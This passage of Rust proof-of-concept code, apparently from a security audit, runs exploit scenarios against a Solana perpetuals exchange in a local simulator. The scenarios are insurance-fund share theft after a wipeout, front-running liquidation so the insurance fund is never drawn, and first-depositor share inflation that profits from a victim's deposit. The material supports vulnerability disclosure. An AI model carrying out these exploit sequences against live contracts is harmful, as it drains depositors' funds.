        usd(read_u64(&e.svm, &mkt, M_INS)), read_u64(&e.svm, &mkt, M_TOTSH), read_u64(&e.svm, &mkt, M_OIL), read_u64(&e.svm, &mkt, M_OIS), read_u64(&e.svm, &mkt, M_RL), read_u64(&e.svm, &mkt, M_RS));
    // close out remaining dead short leg so withdrawals are allowed
    let r = send_ixs_try(&mut e.svm, &[ix_clear_dead_leg(e.prog, e.dex, mkt, cp.pfl)], &e.payer, &[&e.payer]);
    println!("  clearDeadLeg(cp): {:?}", r.map(|_| "ok"));
    println!("  oiL={} oiS={} rawL={} rawS={}", read_u64(&e.svm, &mkt, M_OIL), read_u64(&e.svm, &mkt, M_OIS), read_u64(&e.svm, &mkt, M_RL), read_u64(&e.svm, &mkt, M_RS));
    let lp2 = user(&mut e, 0);
    let rcpt2 = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt, rcpt2, lp2.kp.pubkey(), lp2.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1_000 * POS_SCALE), &e.payer, &[&e.payer, &lp2.kp]);
    let sh1 = read_u64(&e.svm, &rcpt1, 80); let sh2 = read_u64(&e.svm, &rcpt2, 80);
    println!("  LP2 deposits 1000 into empty pool: LP1 shares={} LP2 shares={} insurance={}", sh1, sh2, usd(read_u64(&e.svm, &mkt, M_INS)));
    let b1 = token_amount(&e.svm, &lp1.tok);
    let r = send_ixs_try(&mut e.svm, &[ix_withdraw_insurance(e.prog, e.dex, mkt, rcpt1, lp1.kp.pubkey(), lp1.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, sh1)], &e.payer, &[&e.payer, &lp1.kp]);
    let got1 = token_amount(&e.svm, &lp1.tok) - b1;
    println!("  LP1 (wiped-out shares) withdraws all: {:?} -> receives {} USDC of LP2's fresh deposit", r.map(|_| "ok"), usd(got1));
    let b2 = token_amount(&e.svm, &lp2.tok);
    let _ = send_ixs_try(&mut e.svm, &[ix_withdraw_insurance(e.prog, e.dex, mkt, rcpt2, lp2.kp.pubkey(), lp2.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, sh2)], &e.payer, &[&e.payer, &lp2.kp]);
    println!("  LP2 withdraws all: receives {} of the 1000 deposited", usd(token_amount(&e.svm, &lp2.tok) - b2));

    println!("\n=== PoC3: front-running Liquidate with RefreshLeg discards shortfall -> insurance never drawn ===");
    let (e0, m0, ..) = drain_insurance(&elf, false);
    let (e1, m1, ..) = drain_insurance(&elf, true);
    for (lbl, e, m) in [("liquidate only     ", &e0, m0), ("refresh+liquidate  ", &e1, m1)] {
        println!("  {}: insurance={} realizedPool={} totalPosPnl={}", lbl, usd(read_u64(&e.svm, &m, M_INS)), usd(read_u64(&e.svm, &m, M_REALIZED)), usd(read_u64(&e.svm, &m, M_TOTPNL)));
    }

    println!("\n=== PoC4: first-depositor donation inflation of insurance shares (no min-shares param) ===");
    let mut e = setup(&elf);
    let o = Keypair::new(); e.svm.airdrop(&o.pubkey(), 1_000_000_000).unwrap();
    let creator = user(&mut e, 0);
    let mkt = market(&mut e, &creator, &o, 2500);
    let att = user(&mut e, 0); let vic = user(&mut e, 0);
    let ra = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE); let rv = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    let a0 = token_amount(&e.svm, &att.tok);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt, ra, att.kp.pubkey(), att.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1), &e.payer, &[&e.payer, &att.kp]);
    send_ok(&mut e.svm, ix_deposit_insurance_ext(e.prog, e.dex, mkt, ra, att.kp.pubkey(), att.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1_000 * POS_SCALE, true), &e.payer, &[&e.payer, &att.kp]);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt, rv, vic.kp.pubkey(), vic.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1_999 * POS_SCALE), &e.payer, &[&e.payer, &vic.kp]);
    println!("  shares: attacker={} victim={} (victim deposited 1999)", read_u64(&e.svm, &ra, 80), read_u64(&e.svm, &rv, 80));
    send_ok(&mut e.svm, ix_withdraw_insurance(e.prog, e.dex, mkt, ra, att.kp.pubkey(), att.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1), &e.payer, &[&e.payer, &att.kp]);
    let a1 = token_amount(&e.svm, &att.tok);
    println!("  attacker net P&L = +{}", usd(a1 - a0));
}
